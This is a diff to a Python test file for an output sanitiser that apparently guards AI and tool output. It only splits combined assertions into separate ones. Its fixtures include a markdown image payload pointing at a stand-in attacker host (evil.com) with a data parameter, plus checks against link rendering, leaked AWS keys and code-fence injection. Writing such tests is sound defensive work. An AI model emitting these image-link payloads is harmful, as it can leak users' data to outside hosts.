@@ -42,8 +42,10 @@ ATTACKS = {
 def test_nothing_the_gate_lets_out_renders_as_an_image_or_a_link(name):
     out = sanitise_text(ATTACKS[name])
     rendered = MD.render(out)
-    assert "<img" not in rendered and "href=" not in rendered, (name, out, rendered)
-    assert "<http" not in to_slack_mrkdwn(out) and "evil.com|" not in to_slack_mrkdwn(out), name
+    assert "<img" not in rendered, (name, out, rendered)
+    assert "href=" not in rendered, (name, out, rendered)
+    assert "<http" not in to_slack_mrkdwn(out), name
+    assert "evil.com|" not in to_slack_mrkdwn(out), name
 
 
 @pytest.mark.parametrize("text, gone", [
@@ -70,14 +72,16 @@ def test_keys_are_gated_like_values():
     verdict, clean = outbound_data({"metrics": {"![x](https://evil.com/?d=1) key": 1.0}})
     assert "evil.com" not in str(clean)
     verdict, clean = outbound_data({"metrics": {"key " + AWS_ACCESS_KEY_ID: 1.0}})
-    assert verdict == "BLOCK" and "AKIA" not in str(clean)
+    assert verdict == "BLOCK"
+    assert "AKIA" not in str(clean)
 
 
 def test_the_redact_tool_returns_its_redaction_not_a_link_scrub():
     """MCP redact_text is WARDEN's redaction service: removing URLs from its output was a regression."""
     res = mcp_server.call_tool("redact_text", {"text": "GET https://api.example.com/v1/x from priya.nair@corp.io"})
     text = res.structured_content["redacted"]
-    assert "https://api.example.com/v1/x" in text and "priya.nair@corp.io" not in text
+    assert "https://api.example.com/v1/x" in text
+    assert "priya.nair@corp.io" not in text
 
 
 
@@ -111,7 +115,8 @@ def test_a_log_line_with_four_backticks_leaves_no_run_of_three_inside_a_code_blo
             continue
         if fence:
             inside.append(line)
-    assert inside and not [ln for ln in inside if re.search("`{3,}|~{3,}", ln)], inside
+    assert inside, inside
+    assert not [ln for ln in inside if re.search("`{3,}|~{3,}", ln)], inside
 
 
 def test_a_model_hypothesis_cannot_open_a_tilde_fence():
